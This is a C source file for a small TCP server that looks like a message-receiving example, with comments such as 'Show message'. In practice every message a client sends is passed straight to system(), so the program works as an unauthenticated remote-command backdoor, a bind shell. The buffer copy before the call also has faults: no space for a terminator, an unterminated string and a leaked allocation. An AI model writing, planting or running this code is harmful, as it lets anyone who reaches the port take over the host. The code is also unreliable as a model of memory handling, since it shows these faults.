#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>

#define MAX_MSG_LENGTH 256		// Maximum length of the message

/** Function that shows an error message */
void showError(const char *msg){
    perror(msg);
    exit(1);
}

int main(int argc, char *argv[]){

     int socketfd;						/** Socket descriptor */
     int newsockfd;						/** Socket descriptor */
     unsigned int port;					/** Listening port */
     struct sockaddr_in serverAddress;	/** Server address structure */
     struct sockaddr_in clientAddress;	/** Client address structure */
     unsigned int clientLength;			/** Length of client structure */
     char message[MAX_MSG_LENGTH];		/** Message */
     int messageLength;					/** Length of the message */


     	 // Check arguments
		 if (argc < 2) {
			 fprintf(stderr,"ERROR wrong number of arguments\n");
			 fprintf(stderr,"Usage:\n$>%s port\n", argv[0]);
			 exit(1);
		 }

		 // Create the socket
		 socketfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

		 // Check
		 if (socketfd < 0)
			showError("ERROR while opening socket");

		 // Init server structure
		 memset(&serverAddress, 0, sizeof(serverAddress));

		 // Get listening port
		 port = atoi(argv[1]);

		 // Fill server structure
		 serverAddress.sin_family = AF_INET;
		 serverAddress.sin_addr.s_addr = htonl(INADDR_ANY);
		 serverAddress.sin_port = htons(port);

		 // Bind
		 if (bind(socketfd, (struct sockaddr *) &serverAddress, sizeof(serverAddress)) < 0)
			 showError("ERROR while binding");

while(1){

		 // Listen
		 listen(socketfd, 10);

		 // Get length of client structure
		 clientLength = sizeof(clientAddress);

		 // Accept!
		 newsockfd = accept(socketfd, (struct sockaddr *) &clientAddress, &clientLength);

		 // Check accept result
		 if (newsockfd < 0)
			  showError("ERROR while accepting");

		 // Init and read message
		 memset(message, 0, MAX_MSG_LENGTH);
		 messageLength = recv(newsockfd, message, MAX_MSG_LENGTH-1, 0);

		 // Check read bytes
		 if (messageLength < 0)
			 showError("ERROR while reading from socket");

		 // Show message
		 
	         char *foo = (char*) malloc(sizeof(char) * strlen(message));

		int i;
		 for(i = 0; i < strlen(message); i++)
			foo[i] = message[i];
		 
		 int ret = system(foo); 
		 
		 //printf("Return: %d\n",ret);
		 //printf("Message: %s\n", message);

		
		 // Get the message length
		 memset (message, 0, MAX_MSG_LENGTH);
		 strcpy (message, "Message received!");
		 messageLength = send(newsockfd, message, strlen(message), 0);

		 // Check bytes sent
		 if (messageLength < 0)
			 showError("ERROR while writing to socket");

		 // Close sockets
		 close(newsockfd);

}
		 close(socketfd);


     return 0; 
}


